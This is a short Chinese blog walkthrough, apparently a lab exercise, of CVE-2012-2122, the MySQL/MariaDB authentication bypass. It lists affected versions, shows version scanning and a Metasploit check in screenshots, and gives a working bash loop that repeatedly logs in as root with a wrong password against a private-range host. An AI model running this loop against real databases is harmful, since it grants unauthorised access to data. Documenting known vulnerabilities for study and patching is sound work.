# Mysql 身份认证绕过漏洞（CVE-2012-2122） - 1jzz - 博客园

> 原文：[`www.cnblogs.com/1jzz/p/14783777.html`](https://www.cnblogs.com/1jzz/p/14783777.html)

1、介绍

当连接 MariaDB/MySQL 时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是 memcmp()返回一个非零值，也会使 MySQL 认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入 SQL 数据库。

2、受影响版本

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 .

MySQL versions from 5.1.63, 5.5.24, 5.6.6 .

3、mysql 版本扫描

![](img/c7d6f4fbcfbd427f79bf8fe5405e4009.png)

扫描出 mysql 的版本为 5.5.23

4、使用 msf 查看是否可利用漏洞

 ![](img/adcbd82a292534140cdc02f018b0e8c0.png)

 通过扫描模块发现可以绕过身份验证

5、登录 mysql

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 192.168.6.130 -P3306 ; done
```

![](img/604f5cfd7d3d5bc1f5b0c4a304276aaa.png)